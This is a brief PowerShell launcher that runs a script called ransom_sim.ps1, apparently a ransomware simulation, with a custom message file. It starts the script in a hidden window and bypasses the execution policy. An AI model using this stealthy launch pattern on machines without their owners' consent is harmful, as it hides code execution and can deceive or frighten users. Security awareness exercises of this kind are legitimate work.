# Put your message in msg.txt next to this script (or edit the default)
$msgFile = Join-Path $PSScriptRoot "msg.txt"
$script  = Join-Path $PSScriptRoot "ransom_sim.ps1"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden `
    -File $script -MessageFile $msgFile
